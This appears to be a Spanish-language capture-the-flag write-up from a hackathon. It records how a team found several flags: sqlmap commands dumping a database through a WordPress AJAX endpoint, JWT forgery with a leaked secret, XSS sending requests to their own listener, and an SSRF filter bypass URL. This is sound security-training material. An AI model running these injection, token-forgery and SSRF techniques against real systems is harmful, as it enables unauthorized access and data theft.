# Hackathon NUWE - Schneider Electric

Nombres: Gabriel Juan, Anthony Michael Alonso, Sergi

Equipo/Mesa: 58

## FLAG{ALWAYS_CHECK_COMMITS}

![imagen del commit donde hemos encontrado el flag](./images/FLAG{ALWAYS_CHECK_COMMITS}_1.jpg?raw=true)

Imagen del commit donde hemos encontrado el flag

## FLAG{Update_Plugins!}

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --tables

[20:04:16] [INFO] fetching number of tables for database 'flag'
[20:04:16] [INFO] retrieved: 1
[20:04:18] [INFO] retrieved: flag

python sqlmap.py -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --dump -D flag -T flag

[20:20:00] [INFO] fetching entries for table 'flag' in database 'flag'
[20:20:00] [INFO] fetching number of entries for table 'flag' in database 'flag'
[20:20:00] [INFO] retrieved: 1
[20:20:04] [INFO] retrieved: FLAG{Update_Plugins!}

## API_FLAG{Never_public_your_secret}

![Hacemos el fuzz para encontrar mas endpoints](./images/fuzz_1.jpg?raw=true)

![cambiamos algunas cosas del token(user y le pinemos admin, y ponemos la JWT_SECRET_KEY](./images/token_admin.jpg?raw=true)

Hacemos el fuzz para encontrar mas endpoints y luego cambiamos algunas cosas del token(user y le ponemos admin, y ponemos la JWT_SECRET_KEY con esto si hacemos una peticion POST conseguimos sacar la FLAG

## FLAG{sanitize_input}

![Hacemos cross side scripting para enviar una peticion a nuestro kali](./images/cross_side_scripting_2.jpg?raw=true)

Hacemos cross side scripting para enviar una peticion a nuestro kali

![Ponemos un listener en el teminal y cuando se envia la peticion nosotros con el listener la capturamos y conseguimos la flag](./images/FLAG{sanitize_input}.jpg?raw=true)

Ponemos un listener en el teminal y cuando se envia la peticion nosotros con el listener la capturamos y conseguimos la flag


## FLAG{SSRF_PARA_TOD@S_XD}

![Cambiamos la url para llegar al sitio concreto cambiando letras y todo ](./images/FLAG{SSRF_PARA_TOD@S_XD}.jpg?raw=true)

Para conseguir la Flag hemos usado el URL: http://192.168.56.101/testsite.php?url=http://locAlhost:1337

